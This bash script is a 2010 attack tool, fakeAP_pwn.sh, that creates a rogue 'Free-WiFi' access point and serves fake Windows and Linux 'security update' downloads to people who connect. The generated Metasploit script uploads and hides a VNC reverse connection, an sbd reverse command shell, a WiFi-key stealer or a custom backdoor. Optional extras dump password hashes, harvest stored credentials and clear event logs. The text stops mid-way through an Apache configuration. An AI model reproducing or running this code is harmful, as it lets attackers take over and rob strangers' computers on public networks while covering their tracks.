#!/bin/bash                                                                                    #
# (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
# fakeAP_pwn.sh (v0.3-RC29 2010-07-13)                                                         #
#----------------------------------------------------------------------------------------------#
# Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
# The VNC password is "g0tmi1k" (without "")                                                   #
#----------------------------------------------------------------------------------------------#
# Known issues:                                                                                #
#   - Slowness                                                                                 #
#        Try a different MTU value?                                                            #
#   - No IP                                                                                    #
#        Try...                                                                                #
#   - Wireless N                                                                               #
#        Doesn't work too well!                                                                #
#----------------------------------------------------------------------------------------------#
#ToDo List:                                                                                    #
# v0.4 - HostAP           - Add support for HostAP & Hardware AP                               #
# v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
#                           crafted page without affecting any other clients who are browsing  #
#                           Create a captive portal with:                                      #
#                               -CoovaChilli                                                   #
#                               -FreeRadius                                                    #
#                               -MySQL                                                         #
# v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
# v0.5 - Java exploit     - Different "delivery system" ;)                                     #
# v0.6 - Linux/OSX/x64    - Make compatible                                                    #
# v0.7 - Clone AP         - Copies SSID & BSSID then kick all connected clients...             #
# v0.8 - S.E.T.           - Social Engineering Toolkit                                         #
#                                                                                              #
# Monitor traffic         - That isn't on port 80 before they download the payload             #
# Metasploit "fun"        - Automate a few more "things"                                       #
#----------------------------------------------------------------------------------------------#
#def upload(session,file,filename = \"\",trgloc = \"\")                                        #
#use vnc.rb                                                                                    #
#----------------------------------------------------------------------------------------------#
# Defaults *****~~~Change theses~~~*****
export            ESSID="Free-WiFi"                  # WiFi Name of the fake network.
export    fakeAPchannel=6                            # Channel for the FakeAP
export        interface=eth0                         # The interface you use to surf the internet (Use ifconfig!)
export    wifiInterface=wlan0                        # The interface you want to use for the fake AP (must support monitor mode!) (Use iwconfig!)
export monitorInterface=mon0                         # The interface airmon-ng creates (Use ifconfig!)
export          payload=vnc                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
export   metasploitPath=/pentest/exploits/framework3 # Metasploit directory. No trailing slash.
export       htdocsPath=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
export              mtu=1500                         # 1500/1800/xxxx - If your having timing out problems, change this.
export      transparent=true                         # true/false - Internet access after infected? true = yes, false = no
export      respond2All=false                        # true/false - Respond to every WiFi probe request? true = yes, false = no
export        fakeAPmac=set                          # random/set/false - Change the FakeAP MAC Address?
export       macAddress=00:05:7c:9a:58:3f            # XX:XX:XX:XX:XX:XX  - Use this MAC Address (...Only used when fakeAPmac is "set")
export           extras=false                        # true/false - Runs extra programs after session is created
export            debug=false                        # true/false - If you're having problems
export          verbose=0                            # 0/1/2      - Verbose mode. Displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
#----------------------------------------------------------------------------------------------#
# Defaults *****~~~!Don't touch!~~~*****
export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
export      port=`shuf -i 2000-65000 -n 1`
export   version="0.3-RC29"
trap 'cleanup' 2 # Interrupt - "Ctrl + C"
#----------------------------------------------------------------------------------------------#
function cleanup() {
   echo
   echo -e "\e[01;32m[>]\e[00m Cleaning up..."
   if [ "$debug" != "true" ]; then
      if test -e /tmp/fakeAP_pwn.rb;    then rm /tmp/fakeAP_pwn.rb; fi
      if test -e /tmp/fakeAP_pwn.dns;   then rm /tmp/fakeAP_pwn.dns; fi
      if test -e /tmp/fakeAP_pwn.dhcp;  then rm /tmp/fakeAP_pwn.dhcp; fi
      if test -e /tmp/fakeAP_pwn.wkv;   then rm /tmp/fakeAP_pwn.wkv; fi
      if test -e /tmp/fakeAP_pwn.lock;  then rm /tmp/fakeAP_pwn.lock; fi
      if test -e dsniff.services;       then rm dsniff.services; fi
      if test -e sslstrip.log;          then rm sslstrip.log; fi
      if test -e /etc/apache2/sites-available/fakeAP_pwn; then
         if [ "$verbose" == "2" ] ; then echo "[i] Command: ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"; fi
         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"
         rm /etc/apache2/sites-available/fakeAP_pwn
      fi
      if test -e $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb; then rm $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb; fi
      if test -e $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin;  then rm $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin; fi
      if test -e $htdocsPath/Windows-KB183905-x86-ENU.exe;     then rm $htdocsPath/Windows-KB183905-x86-ENU.exe; fi
      #$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface"
      echo "0" > /proc/sys/net/ipv4/ip_forward
      iptables --flush
      iptables --table nat --flush
      iptables --delete-chain
      iptables --table nat --delete-chain
      route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
   fi
   echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com

 Usage: bash fakeAP_pwn.sh -e [ESSID] -c [channel] -i [interface] -w [interface]
             -m [interface]  -p [sbd/vnc/other] -b [/path] -s [/path] -h [/path] -t [MTU]
             -n -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]

 Common options:
   -e  ---  WiFi Name e.g. Free-WiFi
   -c  ---  Set the channel for the FakeAP to run on

   -i  ---  Internet Interface (which inferface to use - check with ifconfig)  e.g. eth0
   -w  ---  WiFi Interface (which inferface to use - check with ifconfig)  e.g. wlan0
   -m  ---  Monitor Interface (which inferface to use - check with ifconfig)  e.g. mon0

   -p  ---  Payload (sbd/vnc/wkv/other) e.g. vnc
   -b  ---  Backdoor Path (only used when payload is set to other) e.g. /path/to/backdoor.exe
   -s  ---  Metasploit Path (Where is metasploit is located) e.g. /pentest/exploits/framework3
   -h  ---  htdocs path e.g. /var/www/fakeAP_pwn. No trailing slash.

   -t  ---  Maximum Transmission Unit - If your having timing out problems, change this. e.g. 1500
   -n  ---  Do you want them to have internet access after?
   -r  ---  Do you want to respond to every probe request?
   -z  ---  Randomizes the MAC Address of the FakeAP
   -a  ---  Use this MAC Address

   -x  ---  Runs extra programs after session is created
   -d  ---  Debug Mode (Doesnt close any pop up windows)
   -v  ---  Verbose mode (Displays exactly whats going on.)
   -V  ---  Higher level of Verbose
   -u  ---  Update FakeAP_pwn
   -?  ---  This screen

 Known issues:
   - Slowness
        Try a different MTU value?
   - No IP
        Try...
   - Wireless N
        Doesn't work too well!
"
   exit 1
}
function update() {
   #svn checkout http://fakeap-pwn.googlecode.com/svn/
   #svn update
   #wget http://fakeap-pwn.googlecode.com/ fakeAP_pwn.tar.gz

   svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
   echo -n -e "\e[01;36m[>]\e[00m Updated to " && svn info | grep Revision: | awk '{print }'
   exit 2
}
#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m g0tmilk's fakeAP_pwn v$version"

while getopts "e:c:i:w:m:p:b:s:h:t:nrz:a:xdvVu?" OPTIONS; do
  case ${OPTIONS} in
    e     ) export ESSID=$OPTARG;;
    c     ) export fakeAPchannel=$OPTARG;;
    i     ) export interface=$OPTARG;;
    w     ) export wifiInterface=$OPTARG;;
    m     ) export monitorInterface=$OPTARG;;
    p     ) export payload=$OPTARG;;
    b     ) export backdoorPath=$OPTARG;;
    s     ) export metasploitPath=$OPTARG;;
    h     ) export htdocsPath=$OPTARG;;
    t     ) export mtu=$OPTARG;;
    n     ) export transparent="true";;
    r     ) export respond2All="true";;
    z     ) export fakeAPmac=$OPTARG;;
    a     ) export macAddress=$OPTARG;;
    x     ) export extras="true";;
    d     ) export debug="true";;
    v     ) export verbose="1";;
    V     ) export verbose="2";;
    u     ) update;;
    ?     ) help;;
    *     ) echo -e "\e[00;31m[-]\e[00m Unknown option.";;   # DEFAULT
  esac
done

echo -e "\e[01;32m[>]\e[00m Checking environment..."

if [ "$debug" == "true" ]; then
   export xterm="xterm -hold"
   echo -e "\e[00;31m[i] Debug Mode\e[00m"
else
   export xterm="xterm"
fi

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    echo -e "\e[01;33m[i]\e[00m            ESSID=$ESSID
\e[01;33m[i]\e[00m    fakeAPchannel=$fakeAPchannel
\e[01;33m[i]\e[00m        interface=$interface
\e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m   metasploitPath=$metasploitPath
\e[01;33m[i]\e[00m    htdocsPath=$htdocsPath
\e[01;33m[i]\e[00m              mtu=$mtu
\e[01;33m[i]\e[00m      transparent=$transparent
\e[01;33m[i]\e[00m      respond2All=$respond2All
\e[01;33m[i]\e[00m        fakeAPmac=$fakeAPmac
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m        gatewayIP=$gatewayIP
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

if [ "$(id -u)" != "0" ]; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup; fi

if [ "$transparent" == "true" ]; then
    int=$(ifconfig | grep $interface | awk '{print $1}')
    if [ "$int" != "$interface" ]; then
    echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
    if [ "$debug" == "true" ]; then ifconfig; fi
    cleanup
  fi
fi
int=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
if [ "$int" != "$wifiInterface" ]; then
   echo -e "\e[00;31m[-]\e[00m The wireless interface $wifiInterface, isn't correct." 1>&2
   if [ "$debug" == "true" ]; then iwconfig; fi
   cleanup
fi

if [ "$transparent" == "true" ]; then
   if [ -z "$ourIP" ]; then
      if [ "$verbose" == "2" ]; then echo "[i] Command: dhclient $interface"; fi
      $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Acquiring an IP Address" -e "dhclient $interface"
      sleep 3
      export ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
      if [ -z "$ourIP" ]; then
         echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!"
         export pidcheck=`ps aux | grep $interface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
         if [ -n "$pidcheck" ]; then
            kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
         fi
         cleanup
      fi
   fi
fi

if [ "$ESSID" == "" ]; then echo -e "\e[00;31m[-]\e[00m ESSID can't be blank"; cleanup; fi
if [ "$fakeAPchannel" == "" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPchannel can't be blank"; cleanup; fi
if [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ]; then echo -e "\e[00;31m[-]\e[00m payload isn't correct"; cleanup; fi
if [ "$transparent" != "true" ] && [ "$transparent" != "false" ]; then echo -e "\e[00;31m[-]\e[00m transparent isn't correct"; cleanup; fi
if [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ]; then echo -e "\e[00;31m[-]\e[00m respond2All isn't correct"; cleanup; fi
if [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPmac isn't correct"; cleanup; fi
if ! [ `echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$"` ]; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct"; cleanup; fi
if [ "$extras" != "true" ] && [ "$extras" != "false" ]; then echo -e "\e[00;31m[-]\e[00m extras isn't correct"; cleanup; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ]; then echo -e "\e[00;31m[-]\e[00m debug isn't correct"; cleanup; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then echo -e "\e[00;31m[-]\e[00m verbose isn't correct"; cleanup; fi

if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then echo -e "\e[00;31m[-]\e[00m aircrack-ng isn't installed. Try: apt-get install aircrack-ng"; cleanup; fi
if ! test -e /usr/sbin/apache2; then   echo -e "\e[00;31m[-]\e[00m apache2 isn't installed. Try: apt-get install apache2 php"; cleanup; fi
if ! test -e /usr/bin/macchanger; then echo -e "\e[00;31m[-]\e[00m macchanger isn't installed. Try: apt-get install macchanger"; cleanup; fi
if ! test -e /usr/sbin/dhcpd3; then    echo -e "\e[00;31m[-]\e[00m dhcpd3 isn't installed. Try: apt-get install dhcp3-server"; cleanup; fi
if ! test -e /usr/sbin/dnsspoof; then  echo -e "\e[00;31m[-]\e[00m dnsspoof isn't installed. Try: apt-get install dsniff"; cleanup; fi
if ! [ -d "$metasploitPath" ]; then    echo -e "\e[00;31m[-]\e[00m metasploit isn't at $metasploitPath. Try: apt-get install metasploit OR apt-get install framework3"; cleanup; fi
if [ "$payload" == "other" ]; then
   if ! [ -e "$backdoorPath" ]; then
      echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath."
      cleanup
   fi
fi

if ! test -e "$htdocsPath/index.php"; then
   if test -d "www/"; then
      mkdir -p $htdocsPath
      if [ "$verbose" == "2" ] ; then echo "[i] Command: cp -rf www/* $htdocsPath/"; fi
      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "cp -rf www/* $htdocsPath/"
   fi

   if ! test -e "$htdocsPath/index.php"; then
      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $htdocsPath/"
      cleanup
   fi
fi

echo -e "\e[01;32m[>]\e[00m Stopping services and programs..."
if [ "$verbose" == "2" ] ; then echo "[i] Command: killall dhcpd3 apache2 airbase-ng wicd-client"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Programs'" -e "killall dhcpd3 apache2 airbase-ng wicd-client"   # Killing "wicd-client" to prevent channel hopping
if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/dhcp3-server stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "/etc/init.d/dhcp3-server stop"            # Stopping DHCP Server
if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/apache2 stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "/etc/init.d/apache2 stop"                 # Stopping apache Web Server
if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/wicd stop"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'WICD Service'" -e "/etc/init.d/wicd stop"                       # Stopping WICD
#if [ "$verbose" == "2" ] ; then echo "[i] Command: service network-manager stop"; fi
#$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu)

echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng stop $monitorInterface"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface" &
sleep 3
if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $wifiInterface down"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing down $wifiInterface" -e "ifconfig $wifiInterface down" &
sleep 1
if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $wifiInterface up"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing up $wifiInterface" -e "ifconfig $wifiInterface up"
export pidcheck2=`ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
if [ -n "$pidcheck2" ]; then
   if [ "$verbose" == "2" ] ; then echo "[i] Command: kill $pidcheck2"; fi
   kill $pidcheck2 # Kill everything on the wifi interface before starting monitor mode, to prevent interference
fi
if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng start $wifiInterface"; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Starting)" -e "airmon-ng start $wifiInterface" &
sleep 5
int=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$int" != "$monitorInterface" ]; then
   sleep 5 # Some people need to wait a little bit longer, some don't. Don't force the ones that don't need it!
   int=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$int" != "$monitorInterface" ]; then
      echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isn't correct." 1>&2
      if [ "$debug" == "true" ]; then iwconfig; fi
      cleanup
   fi
fi

if [ "$fakeAPmac" == "random" ]; then
   echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
   if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up"; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up" &
   sleep 2
fi
if [ "$fakeAPmac" == "set" ]; then
   echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
   if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up"; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up" &
   sleep 2
fi

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
    macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
    echo -e "\e[01;33m[i]\e[00m       macAddress=$macAddress $macAddressType"
fi

echo -e "\e[01;32m[>]\e[00m Creating scripts..."
# metasploit script
if test -e /tmp/fakeAP_pwn.rb; then rm /tmp/fakeAP_pwn.rb; fi
echo "# Id: fakeAP_pwn.rb v$version$
# Author: g0tmi1k at http://g0tmi1k.blogspot.com


################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
host      = @client.sys.config.sysinfo['Computer']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")

######################## Functions ########################
def doLinux
	print_status(\"Coming soon...\")
end

def doOSX
	print_status(\"Coming soon...\")
end

def doWindows
	session.response_timeout=120
	begin"> /tmp/fakeAP_pwn.rb
if [ "$payload" == "vnc" ]; then
   echo "		print_status(\"Stopping: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM winvnc.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Deleting: VNC\")
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\winvnc.exe DEL /f IF EXIST %SystemDrive%\\\winvnc.exe\", nil, {'Hidden' => true})
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnchooks.dll DEL /f IF EXIST %SystemDrive%\\\vnchooks.dll\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: VNC (%SystemDrive%\\\winvnc.exe)\")
		session.fs.file.upload_file(\"%SystemDrive%\\\winvnc.exe\", \"$htdocsPath/winvnc.exe\")
		session.fs.file.upload_file(\"%SystemDrive%\\\vnchooks.dll\", \"$htdocsPath/vnchooks.dll\")
		session.fs.file.upload_file(\"%SystemDrive%\\\vnc.reg\", \"$htdocsPath/vnc.reg\")
		sleep(1)

		print_status(\"Configuring: VNC\")
		session.sys.process.execute(\"regedit.exe /S %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Executing: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\winvnc.exe -kill -run\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Configuring: VNC (Reserving connection).\")
		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\winvnc.exe -connect 10.0.0.1\", nil, {'Hidden' => true})

		print_status(\"Deleting: Temp files\")
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnc.reg DEL /f IF EXIST %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "sbd" ]; then
   echo "		print_status(\"Stopping: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM sbd.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Deleting: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\sbd.exe DEL /f IF EXIST %SystemDrive%\\\sbd.exe\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: SecureBackDoor (%SystemDrive%\\\sbd.exe)\")
		session.fs.file.upload_file(\"%SystemDrive%\\\sbd.exe\", \"$htdocsPath/sbd.exe\")
		sleep(1)

		print_status(\"Executing: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\sbd.exe -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "wkv" ]; then
   echo "	print_status(\"  Uploading: Wireless Key Viewer (%SystemDrive%\\\wkv.exe)\")
		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
			session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocsPath/wkv-x64.exe\")
		else
			session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocsPath/wkv-x86.exe\")
		end
		sleep(1)

		print_status(\"  Executing: wkv.exe\")
		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\wkv.exe /stabular \\\"%SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%SystemDrive%\\\wkv.txt\")

		print_status(\"   Deleting: Traces\")
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.exe DEL /f IF EXIST %SystemDrive%\\\wkv.exe\", nil, {'Hidden' => true})
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.txt DEL /f IF EXIST %SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
else
   echo "		print_status(\"Stopping: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM backdoor.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Deleting: %SystemDrive%\\\backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\backdoor.exe DEL /f IF EXIST %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: backdoor.exe (%SystemDrive%\\\backdoor.exe)\")
		session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")
		sleep(1)

		print_status(\"Executing: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
fi
echo "		sleep(1)

	rescue ::Exception => e
		print_status(\"Error: #{e.class} #{e}\")
	end
end

def checkuac(session)
	begin
		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
		value = open_key.query_value(\"EnableLUA\").data
		if value == 1
			print_status(\" UAC: Enabled\")
		else
			print_status(\" UAC: Disabled\")
		end
	rescue ::Exception => e
		print_status(\"Error Checking UAC: #{e.class} #{e}\")
	end
end

########################### Main ##########################
print_line(\"[*] g0tmi1k's fakeAP_pwn $version\")" >> /tmp/fakeAP_pwn.rb

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"  IP: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
print_status(\"Host: #{host}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
checkuac(session)
end
print_status(\"Arch: #{arch}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
fi
echo "if os =~ /Linux/
	doLinux
elsif os =~ /OSX/
	doOSX
elsif os =~ /Windows/
#	run getcountermeasure.rb -d
	doWindows
else
	print_error(\"Unsupported OS\")
	exit
end

print_status(\" Unlocking: fakeAP_pwn\")
output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
output.puts(\"g0tmi1k\")
output.close
sleep(1)" >> /tmp/fakeAP_pwn.rb

if [ "$debug" == "true" ] || [ "$extras" == "true" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
use priv
getsystem
hashdump # >> /tmp/fakeAP_Pwn.hash
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
fi
echo "

print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.rb ; fi

# dhcpd script
if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
echo "# g0tmi1k - fakeAP_pwn.dhcp v$version
ddns-update-style interim;
ignore client-updates; # Ignore all client requests for DDNS update
authoritative;
default-lease-time 86400; # 24 hours
max-lease-time 172800; # 48 hours
log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.150 10.0.0.250;
  option routers 10.0.0.1;
  option subnet-mask 255.255.255.0;
  option broadcast-address 10.0.0.255;
  option domain-name \"Home.com\";
  option domain-name-servers 10.0.0.1;
  option netbios-name-servers 10.0.0.99; # The NetBIOS name server (WINS)
}" > /tmp/fakeAP_pwn.dhcp
if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dhcp; fi

# dns script
if [ "$transparent" != "true" ]; then
   echo "10.0.0.1 *" > /tmp/fakeAP_pwn.dns
   if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.dns"; fi
   if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dns; fi
fi

# apache - virtual host
if test -e /etc/apache2/sites-available/fakeAP_pwn; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
echo "<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot $htdocsPath
	ServerName "10.0.0.1"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $htdocsPath>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
	ErrorLog /var/log/apache2/fakeAP_pwn-error.log
	LogLevel warn
	CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
</VirtualHost>
<IfModule mod_ssl.c>
<VirtualHost _default_:443>
	ServerAdmin webmaster@localhost
	DocumentRoot $htdocsPath
	ServerName "10.0.0.1"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $htdocsPath>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
	ErrorLog /var/log/apache2/error.log
	LogLevel warn
	CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
	SSLEngine on
	SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
	SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
